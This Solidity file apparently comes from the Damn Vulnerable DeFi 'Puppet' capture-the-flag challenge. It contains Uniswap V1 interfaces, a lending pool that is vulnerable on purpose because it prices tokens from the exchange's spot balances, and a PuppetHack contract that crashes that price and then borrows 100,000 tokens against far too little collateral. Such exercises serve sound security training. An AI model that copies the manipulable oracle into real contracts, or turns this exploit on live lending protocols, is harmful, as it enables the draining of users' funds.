// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { console2 } from "@dev/forge-std/console2.sol";
import { Address } from "@openzeppelin/contracts-v4.7.3/utils/Address.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts-v4.7.3/security/ReentrancyGuard.sol";
import { DamnValuableToken } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableToken.sol";

// https://etherscan.io/address/0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95#code
// https://docs.uniswap.org/contracts/v1/guides/connect-to-uniswap
// https://hackmd.io/@HaydenAdams/HJ9jLsfTz
// https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy
interface IUniswapV1Exchange {
    // Address of ERC20 token sold on this exchange
    function tokenAddress() external view returns (address token);
    // Address of Uniswap Factory
    function factoryAddress() external view returns (address factory);
    // Provide Liquidity
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    )
        external
        payable
        returns (uint256);
    function removeLiquidity(
        uint256 amount,
        uint256 min_eth,
        uint256 min_tokens,
        uint256 deadline
    )
        external
        returns (uint256, uint256);
    // Get Prices
    function getEthToTokenInputPrice(uint256 eth_sold) external view returns (uint256 tokens_bought);
    function getEthToTokenOutputPrice(uint256 tokens_bought) external view returns (uint256 eth_sold);
    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256 eth_bought);
    function getTokenToEthOutputPrice(uint256 eth_bought) external view returns (uint256 tokens_sold);
    // Trade ETH to ERC20
    function ethToTokenSwapInput(
        uint256 min_tokens,
        uint256 deadline
    )
        external
        payable
        returns (uint256 tokens_bought);
    function ethToTokenTransferInput(
        uint256 min_tokens,
        uint256 deadline,
        address recipient
    )
        external
        payable
        returns (uint256 tokens_bought);
    function ethToTokenSwapOutput(
        uint256 tokens_bought,
        uint256 deadline
    )
        external
        payable
        returns (uint256 eth_sold);
    function ethToTokenTransferOutput(
        uint256 tokens_bought,
        uint256 deadline,
        address recipient
    )
        external
        payable
        returns (uint256 eth_sold);
    // Trade ERC20 to ETH
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    )
        external
        returns (uint256 eth_bought);
    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    )
        external
        returns (uint256 eth_bought);
    function tokenToEthSwapOutput(
        uint256 eth_bought,
        uint256 max_tokens,
        uint256 deadline
    )
        external
        returns (uint256 tokens_sold);
    function tokenToEthTransferOutput(
        uint256 eth_bought,
        uint256 max_tokens,
        uint256 deadline,
        address recipient
    )
        external
        returns (uint256 tokens_sold);
    // Trade ERC20 to ERC20
    function tokenToTokenSwapInput(
        uint256 tokens_sold,
        uint256 min_tokens_bought,
        uint256 min_eth_bought,
        uint256 deadline,
        address token_addr
    )
        external
        returns (uint256 tokens_bought);
    function tokenToTokenTransferInput(
        uint256 tokens_sold,
        uint256 min_tokens_bought,
        uint256 min_eth_bought,
        uint256 deadline,
        address recipient,
        address token_addr
    )
        external
        returns (uint256 tokens_bought);
    function tokenToTokenSwapOutput(
        uint256 tokens_bought,
        uint256 max_tokens_sold,
        uint256 max_eth_sold,
        uint256 deadline,
        address token_addr
    )
        external
        returns (uint256 tokens_sold);
    function tokenToTokenTransferOutput(
        uint256 tokens_bought,
        uint256 max_tokens_sold,
        uint256 max_eth_sold,
        uint256 deadline,
        address recipient,
        address token_addr
    )
        external
        returns (uint256 tokens_sold);
    // Trade ERC20 to Custom Pool
    function tokenToExchangeSwapInput(
        uint256 tokens_sold,
        uint256 min_tokens_bought,
        uint256 min_eth_bought,
        uint256 deadline,
        address exchange_addr
    )
        external
        returns (uint256 tokens_bought);
    function tokenToExchangeTransferInput(
        uint256 tokens_sold,
        uint256 min_tokens_bought,
        uint256 min_eth_bought,
        uint256 deadline,
        address recipient,
        address exchange_addr
    )
        external
        returns (uint256 tokens_bought);
    function tokenToExchangeSwapOutput(
        uint256 tokens_bought,
        uint256 max_tokens_sold,
        uint256 max_eth_sold,
        uint256 deadline,
        address exchange_addr
    )
        external
        returns (uint256 tokens_sold);
    function tokenToExchangeTransferOutput(
        uint256 tokens_bought,
        uint256 max_tokens_sold,
        uint256 max_eth_sold,
        uint256 deadline,
        address recipient,
        address exchange_addr
    )
        external
        returns (uint256 tokens_sold);
    // ERC20 comaptibility for liquidity tokens

    // bytes32 public name;
    // bytes32 public symbol;
    // uint256 public decimals;

    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address _from, address _to, uint256 value) external returns (bool);
    function approve(address _spender, uint256 _value) external returns (bool);
    function allowance(address _owner, address _spender) external view returns (uint256);
    function balanceOf(address _owner) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    // Never use
    function setup(address token_addr) external;
}

interface IUniswapV1Factory {
    // Public Variables
    // address public exchangeTemplate;
    // uint256 public tokenCount;

    // Create Exchange
    function createExchange(address token) external returns (address exchange);
    // Get Exchange and Token Info
    function getExchange(address token) external view returns (address exchange);
    function getToken(address exchange) external view returns (address token);
    function getTokenWithId(uint256 tokenId) external view returns (address token);
    // Never use
    function initializeFactory(address template) external;
}

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapExchange;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapExchange = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired) {
            revert NotEnoughCollateral();
        }

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if (!token.transfer(recipient, amount)) {
            revert TransferFailed();
        }

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    /*
        depositRequired =
            amount * (uniswapExchange ether balance / uniswapExchange token balance)
                            * DEPOSIT_FACTOR
    */

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapExchange.balance * (10 ** 18) / token.balanceOf(uniswapExchange);
    }
}

contract PuppetHack {
    uint256 constant SELL_DVT_AMOUNT = 1000 ether;
    uint256 constant DEPOSIT_FACTOR = 2;
    uint256 constant BORROW_DVT_AMOUNT = 100_000 ether;

    IUniswapV1Exchange immutable uniswapExchange;
    DamnValuableToken immutable token;
    PuppetPool immutable pool;
    address immutable player;

    constructor(address _token, address _pair, address _pool, address _player) {
        token = DamnValuableToken(_token);
        uniswapExchange = IUniswapV1Exchange(_pair);
        pool = PuppetPool(_pool);
        player = _player;
    }

    function attack() external payable {
        // Dump DVT to the Uniswap Pool
        token.approve(address(uniswapExchange), type(uint256).max);
        // https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L232
        uniswapExchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 9, block.timestamp, address(this));

        // Calculate required collateral
        uint256 price = address(uniswapExchange).balance * (10 ** 18) / token.balanceOf(address(uniswapExchange));
        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        // Borrow and steal the DVT
        pool.borrow{ value: depositRequired }(BORROW_DVT_AMOUNT, player);
        // send all token to player
        token.transfer(player, token.balanceOf(address(this)));
    }

    receive() external payable { }
}
